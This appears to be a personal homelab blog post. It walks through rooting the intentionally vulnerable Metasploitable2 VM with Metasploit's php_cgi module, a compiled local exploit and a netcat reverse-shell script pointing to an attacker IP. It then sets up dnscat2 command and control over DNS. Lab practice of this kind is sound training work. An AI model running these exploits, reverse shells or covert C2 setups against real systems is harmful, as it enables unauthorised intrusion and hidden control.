---
title: A quick referesher of the homelab
categories: [homelab]
tags: [homelab, domain, dns, dnscat2] # TAG names should always be lowercase
img_path: /assets/img/homelab
---

[main](/posts/homelab_intro)

## Gain `root` access on metasploitable2
### Gain `www-data` user access:
```bash
# www-data service user access:
  # searchsploit
  searchsploit apache 2.2.8 # out: Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution 
```
msfconsole - metasploit:
	RHOSTS & RPORT- Address & PORT to access the webserver. 
```bash
use php_cgi
set RHOSTS 192.168.189.254
set RPORT 8080
set LPORT 80
run
```

### Root Access:
netcat listener on attacking machine: `sudo netcat -nlvp 443`

```bash
# meterpreter
cd /tmp
upload /usr/share/exploitdb/exploits/linux/local/8572.c ./exp.c
shell

# shell on meterpreter # exp needs "run"
echo '#!/bin/sh' > run
echo '/bin/netcat -e /bin/sh <attacker_ip> 443' >> run
gcc exp.c -o exp
chmod +x exp
cat /proc/net/netlink # search for a positive pid (udev's pid minus 1)
./exp 2708 # say 2708 the pid
```

netcat listener on attacking machine: `whoami`

A better shell (on the attacking machine):
```bash
python -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
<ctr+z>
stty raw -echo; fg
```
> You should have the root access
{: .prompt-info}

## DNS based command and control
1. Setup an Authoritative DNS server
2. Install dnscat2 on the server and client
3. Get command and control over DNS

Network traffic:
![dns](dnscat2_traffic_blur.png)

## Setup an authoritative DNS server:
If you are using AWS: [STOK’s video](https://youtu.be/p8wbebEgtDk)
Else, (Still, watch that. It's a good learning src.) I made one: 
1. Spin up a droplet. [droplet_setup]
2. [Get a domain name](/posts/c2_over_dns/#get-a-domain-name) and point the nameservers to digitalocean nameservers
3. Setup the domain on digitalocean
4. Set low ttl for each DNS record type (It may take sometime for DNS propagation.)

## C2 using dnscat2
Download dnscat2: `git clone https://github.com/iagox86/dnscat2.git`

Server:
```bash
# mkdir tools; cd tools; git clone dnscat2; cd dnscat2/server
sudo gem install bundler
sudo chown -R <user_name> /var/lib/gems
sudo apt install ruby-dev make gcc
bundle install
sudo ruby ./dnscat2.rb example.com # your domain name
dnscat2> start --dns port=53531,domain=example.com # you'll get the secret value

# on client
sudo ./dnscat port=53531 --secret=<secret> example.com # or
sudo ./dnscat --dns port=53531,server=<ip>--secret=<secret>

# on server
dnscat2>
	windows
	window -i 1 # session number of the connection
	help # get shell
	shell
	# ctr+z to escape
	windows # list
	window -i 2 # go to the sh window
```

## Active Directory setup
[Active Directory on Azure](https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f)

- I learnt AD through PEH course by TCM security. I highly recommend going through the course if you are serious about active directory pentesting. The above link is a reommnedation by Heath Adams, and it was a great source for setting up your AD network on Azure (similar setup locally). 

Update: The link is now medium members only. So, go with: https://refabr1k.gitbook.io/oscp/windows/attacking-ad/ad-hacking-lab-setup if you can't use the medium link.
